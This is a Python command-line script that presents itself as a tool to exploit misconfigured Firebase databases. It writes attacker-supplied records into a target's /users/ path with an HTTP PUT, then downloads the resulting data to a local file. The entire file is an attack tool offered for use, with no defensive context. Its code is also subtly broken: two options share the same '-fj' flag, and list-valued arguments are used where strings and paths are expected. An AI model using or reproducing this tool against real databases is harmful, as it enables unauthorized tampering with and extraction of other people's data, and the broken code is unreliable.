import argparse
import json
from pathlib import Path
from urllib.request import urlopen

import requests


class ExploitByExpoFileTool:
    def __init__(self, firebase_instance, file_for_inject, file_for_output, name, nick_name, email, message):
        self.email = email
        self.file_for_inject = file_for_inject
        self.file_for_output = file_for_output
        self.firebase_instance = firebase_instance
        self.message = message
        self.name = name
        self.nick_name = nick_name


# noinspection SpellCheckingInspection
def cli() -> ExploitByExpoFileTool:
    parser = argparse.ArgumentParser(description='A simple python script to exploit vulnerable Firebase Database')
    parser.add_argument(
        "-u", "--database-url", type=str, nargs=1,
        help='URL firebase instance (script accept part between https:// and .firebaseio.com ) )', )
    parser.add_argument(
        "-fj", "--file_for_inject", type=Path, nargs=1,
        help='file, that will be used for poison db')
    parser.add_argument(
        "-fj", "--file_for_output", type=Path, nargs=1,
        help='file, that contains result dump of data')
    parser.add_argument(
        "-m", "--mail", type=str, nargs=1,
        help='mail, that will be inserted to db', )
    parser.add_argument(
        "-msg", "--message", type=str, nargs=1,
        help='mail, that will be inserted to db')
    parser.add_argument(
        "-nm", "--name", type=str, nargs=1,
        help='name, that will be inserted to db')
    parser.add_argument(
        "-nk", "--nick_name", type=str, nargs=1,
        help='nickname, that will be inserted to db')
    return from_cli(args=parser.parse_args())


def from_cli(args: argparse.Namespace):
    return ExploitByExpoFileTool(
        email=args.mail,
        file_for_inject=args.file_for_inject,
        file_for_output=args.file_for_output,
        firebase_instance=args.database_url,
        message=args.message,
        name=args.name,
        nick_name=args.nick_name,
    )


# noinspection SpellCheckingInspection
def firebase_exploit(input_exploit: ExploitByExpoFileTool):
    print("\nVerifying if Exploit Successful...\n")
    firebase_instance_url = f"https://{input_exploit.firebase_instance}.firebaseio.com" \
                            f"/users/{input_exploit.file_for_inject}.json"
    data = {"Exploit": "Successfully", "Name": input_exploit.name, "Username": input_exploit.nick_name,
            "Email": input_exploit.email, "Message": input_exploit.message}
    response = requests.put(firebase_instance_url, json=data)

    def extract_data(input_firebase_instance_url):
        return json.dumps(json.loads(urlopen(input_firebase_instance_url).read()))

    try:
        if response.status_code == 200:
            print(f"Exploited Url: {firebase_instance_url}")
            print(f"Data Uploaded on Database stored at {input_exploit.file_for_output}")
            input_exploit.file_for_output.write_text(extract_data(firebase_instance_url))
        if response.status_code == 401:
            print("NOT EXPLOITABLE; Reason: All Permissions Denied")
        if response.status_code == 404:
            print("NOT EXPLOITABLE; Reason: Firebase DB Not Found")
    except Exception as ex:
        print("NOT EXPLOITABLE; Reason: Reason: Unknown Error")
        print(ex)


if __name__ == '__main__':
    firebase_exploit(cli())
